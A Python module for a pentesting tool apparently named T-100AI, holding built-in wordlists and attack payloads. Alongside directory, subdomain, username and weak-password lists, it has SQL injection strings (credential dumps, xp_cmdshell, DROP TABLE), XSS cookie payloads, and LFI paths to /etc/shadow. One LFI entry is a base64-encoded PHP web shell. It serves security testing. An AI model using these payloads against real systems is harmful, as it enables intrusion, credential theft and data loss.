"""Diccionarios integrados para pentesting, CTF y auditoria."""

from datetime import datetime


class AttackDictionary:
    """
    Coleccion de wordlists integradas en T-100AI.
    No requiere archivos externos — todo en memoria.
    """

    # ── Directorios comunes (72) ───────────────────────────────────────
    _DIRECTORIES = [
        "admin", "login", "dashboard", "api", "v1", "v2", "wp-admin",
        "wp-login.php", "wp-content", "wp-includes", "phpmyadmin",
        "phpinfo.php", "info.php", "test", "backup", "backups",
        "old", "temp", "tmp", "cache", "config", "conf", "etc",
        "includes", "lib", "library", "media", "images", "img",
        "css", "js", "assets", "uploads", "files", "downloads",
        "docs", "documentation", "readme", "readme.html", "license",
        "changelog", "install", "setup", "update", "upgrade",
        "server-status", "server-info", ".git", ".env", ".htaccess",
        ".htpasswd", "robots.txt", "sitemap.xml", "crossdomain.xml",
        "favicon.ico", "web.config", "xmlrpc.php", "cgi-bin",
        "manager", "console", "portal", "webmail", "mail",
        "ftp", "ssh", "sftp", "database", "db", "sql",
        "debug", "trace", "error", "log", "logs",
    ]

    # ── Subdominios comunes (120+) ─────────────────────────────────────
    _SUBDOMAINS = [
        "www", "mail", "ftp", "smtp", "pop", "imap", "webmail",
        "mx", "ns1", "ns2", "dns", "dns1", "dns2",
        "dev", "staging", "test", "qa", "uat", "prod",
        "api", "api-v1", "api-v2", "graphql",
        "admin", "portal", "dashboard", "console", "manage",
        "app", "mobile", "m", "beta", "demo",
        "blog", "forum", "wiki", "docs", "help", "support",
        "cdn", "static", "assets", "images", "img", "media",
        "db", "database", "mysql", "postgres", "mongo", "redis",
        "git", "svn", "jenkins", "ci", "build",
        "vpn", "ssh", "sftp", "rdp", "remote",
        "monitor", "grafana", "prometheus", "kibana", "elastic",
        "s3", "storage", "backup", "logs",
        "auth", "oauth", "sso", "login", "saml",
        "proxy", "lb", "loadbalancer", "nginx", "apache",
        "docker", "k8s", "kubernetes", "container",
        "jenkins", "artifactory", "nexus", "registry",
        "jira", "confluence", "slack", "teams",
        "crm", "erp", "hr", "finance", "billing",
        "shop", "store", "ecommerce", "cart", "checkout",
        "stg", "preprod", "sandbox", "training",
        "internal", "intranet", "extranet",
    ]

    # ── Usernames comunes (60+) ────────────────────────────────────────
    _USERNAMES = [
        "admin", "administrator", "root", "user", "test", "guest",
        "info", "support", "webmaster", "postmaster", "hostmaster",
        "sysadmin", "operator", "manager", "sales", "marketing",
        "ftp", "www", "mail", "backup", "oracle", "postgres",
        "mysql", "tomcat", "jenkins", "deploy", "ubuntu", "centos",
        "vagrant", "docker", "ansible", "nagios", "monitor",
        "service", "svc", "app", "api", "system", "network",
        "security", "dev", "developer", "qa", "staging",
        "john", "jane", "bob", "alice", "charlie", "dave",
        "administrator", "demo", "temp", "operator", "guest",
        "testuser", "testuser1", "admin1", "user1",
    ]

    # ── Contraseñas comunes (150+) ─────────────────────────────────────
    _PASSWORDS = [
        "password", "password1", "password123", "123456", "12345678",
        "123456789", "1234567890", "qwerty", "abc123", "monkey",
        "master", "dragon", "111111", "baseball", "iloveyou",
        "trustno1", "sunshine", "letmein", "football", "shadow",
        "superman", "michael", "admin", "admin123", "admin1",
        "root", "toor", "pass", "pass123", "passw0rd", "p@ssw0rd",
        "welcome", "welcome1", "hello", "hello123", "charlie",
        "donald", "password1!", "P@ssw0rd!", "Admin123!",
        "Summer2024", "Winter2024", "Spring2024", "Fall2024",
        "Company1!", "Company123", "changeme", "default",
        "test", "test123", "guest", "guest123",
        "letmein1", "qwerty123", "asdf1234", "zxcvbnm",
        "1q2w3e4r", "1qaz2wsx", "zaq1xsw2", "000000",
        "121212", "654321", "987654321", "123321",
        "pass@word", "Passw0rd", "Password1", "Password1!",
        "Welcome1", "Welcome123!", "Temp1234", "Temp!234",
        "Season2024!", "Season2024", "P@ss1234", "p@ss1234",
        "root123", "toor123", "admin!@#", "admin@123",
        "administrator", "Administrador", "superadmin",
        "backup", "backup123", "ftp", "ftp123",
        "mysql", "mysql123", "postgres", "postgres123",
        "oracle", "oracle123", "tomcat", "tomcat123",
        "jenkins", "jenkins123", "deploy", "deploy123",
        "ubuntu", "ubuntu123", "centos", "centos123",
        "vagrant", "vagrant123", "docker", "docker123",
        "ansible", "ansible123", "nagios", "nagios123",
        "service", "service123", "svc", "svc123",
        "app", "app123", "api", "api123",
        "system", "system123", "network", "network123",
        "security", "security123", "dev", "dev123",
        "developer", "developer123", "qa", "qa123",
        "staging", "staging123", "production", "prod",
        "test", "test1", "test12", "test123", "test1234",
        "demo", "demo123", "temp", "temp123",
        "operator", "operator123", "manager", "manager123",
        "sales", "sales123", "marketing", "marketing123",
        "info", "info123", "support", "support123",
        "webmaster", "webmaster123", "postmaster", "postmaster123",
    ]

    # ── SQL Injection payloads ─────────────────────────────────────────
    _SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1' /*",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "'; EXEC xp_cmdshell('dir')--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
        "1; DROP TABLE users--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))abc)--",
        "1' AND BENCHMARK(5000000,SHA1('test'))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' GROUP BY 1--",
    ]

    # ── XSS payloads ───────────────────────────────────────────────────
    _XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'>",
        "'><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=\"alert('XSS')\">",
        "<audio src=x onerror=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<button onclick=alert('XSS')>click</button>",
        "<div onmouseover=alert('XSS')>hover</div>",
        "<a href='javascript:alert(\"XSS\")'>click</a>",
    ]

    # ── LFI payloads ───────────────────────────────────────────────────
    _LFI_PAYLOADS = [
        "/etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/group",
        "/proc/self/environ",
        "/proc/version",
        "/proc/cmdline",
        "/proc/sched_debug",
        "/proc/mounts",
        "/proc/net/arp",
        "/proc/net/tcp",
        "/proc/net/udp",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/dpkg.log",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "C:\\Windows\\system32\\drivers\\etc\\hosts",
        "C:\\boot.ini",
        "C:\\Windows\\win.ini",
    ]

    # ── CVE search patterns ────────────────────────────────────────────
    _CVE_PATTERNS = [
        "CVE-2024-",
        "CVE-2023-",
        "CVE-2022-",
        "CVE-2021-",
        "CVE-2020-",
        "CVE-2019-",
        "CVE-2018-",
        "CVE-2017-",
        "CVE-2016-",
        "CVE-2015-",
        "CVE-2014-",
        "CVE-2013-",
        "CVE-2012-",
        "CVE-2011-",
        "CVE-2010-",
        "CVE-2009-",
        "CVE-2008-",
        "CVE-2007-",
    ]

    # ── Getters ────────────────────────────────────────────────────────

    def get_directories(self) -> list[str]:
        return list(self._DIRECTORIES)

    def get_subdomains(self) -> list[str]:
        return list(self._SUBDOMAINS)

    def get_usernames(self) -> list[str]:
        return list(self._USERNAMES)

    def get_passwords(self) -> list[str]:
        return list(self._PASSWORDS)

    def get_sql_payloads(self) -> list[str]:
        return list(self._SQL_PAYLOADS)

    def get_xss_payloads(self) -> list[str]:
        return list(self._XSS_PAYLOADS)

    def get_lfi_payloads(self) -> list[str]:
        return list(self._LFI_PAYLOADS)

    def get_cve_patterns(self) -> list[str]:
        return list(self._CVE_PATTERNS)

    def get_all(self) -> dict[str, list[str]]:
        return {
            "directories": self.get_directories(),
            "subdomains": self.get_subdomains(),
            "usernames": self.get_usernames(),
            "passwords": self.get_passwords(),
            "sql_injection": self.get_sql_payloads(),
            "xss": self.get_xss_payloads(),
            "lfi": self.get_lfi_payloads(),
            "cve_patterns": self.get_cve_patterns(),
        }

    def stats(self) -> dict[str, int]:
        return {k: len(v) for k, v in self.get_all().items()}

    def generate_password_mutations(self, base: str) -> list[str]:
        """Genera mutaciones típicas de contraseña a partir de una base.

        Utilidad de auditoría defensiva: variantes predecibles (año actual,
        sufijos comunes, leet básico) para audits de contraseñas autorizados.
        """
        if not base:
            return []
        year = str(datetime.now().year)
        mutations = [
            base,
            base.capitalize(),
            base.upper(),
            base.lower(),
            base + "123",
            base + "123!",
            base + "!",
            base + year,
            base + year + "!",
            base[0].upper() + base[1:] + "1",
            base.replace("a", "@").replace("e", "3").replace("i", "1").replace("o", "0"),
        ]
        return sorted(set(mutations))
